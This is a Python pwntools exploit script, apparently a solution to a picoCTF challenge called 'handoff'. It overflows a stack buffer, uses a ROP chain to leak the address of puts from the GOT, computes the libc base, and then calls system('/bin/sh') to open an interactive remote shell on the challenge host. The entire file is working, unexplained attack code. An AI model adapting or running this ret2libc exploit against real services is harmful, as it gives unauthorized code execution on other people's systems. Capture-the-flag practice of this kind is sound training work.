from pwn import *

context.binary = ELF("./handoff")
context.terminal = ["tmux", "splitw", "-h"]

POP_RDI = 0x4014b3
RET = 0x401016
PUTS_PLT = context.binary.plt["puts"]
PUTS_GOT = context.binary.got["puts"]
MAIN = 0x40140f

OFFSET = 20

def create_payload(chain):
    return b"A" * OFFSET + b"".join(map(p64, chain))


def leak(conn, address):
    payload = b"A" * OFFSET
    payload += p64(RET)
    payload += p64(POP_RDI)
    payload += p64(address)
    payload += p64(PUTS_PLT)
    payload += p64(MAIN)

    conn.sendlineafter(b"option", b"3")
    conn.sendlineafter(b"appreciate it: ", payload)

    leaked = conn.recvline().strip()
    log.info(f"raw leak: {leaked}")
    if leaked == b"":
        leaked = conn.recvline().strip()
        log.info(f"fallback leak: {leaked}")
    return leaked.ljust(8, b"\x00")


def exploit(host, port, libc_path="/usr/lib/x86_64-linux-gnu/libc.so.6"):
    libc = ELF(libc_path)
    io = remote(host, port)

    leak_data = leak(io, PUTS_GOT)
    puts_leak = u64(leak_data)
    log.success(f"puts leak: {hex(puts_leak)}")

    libc_base = puts_leak - libc.symbols["puts"]
    system = libc_base + libc.symbols["system"]
    binsh = libc_base + next(libc.search(b"/bin/sh\x00"))

    log.success(f"libc base: {hex(libc_base)}")
    log.success(f"system: {hex(system)}")
    log.success(f"/bin/sh: {hex(binsh)}")

    payload = b"A" * OFFSET
    payload += p64(RET)
    payload += p64(POP_RDI)
    payload += p64(binsh)
    payload += p64(system)
    payload += p64(MAIN)

    io.sendlineafter(b"option", b"3")
    io.sendlineafter(b"appreciate it: ", payload)

    io.interactive()


if __name__ == "__main__":
    exploit("shape-facility.picoctf.net", 50945)
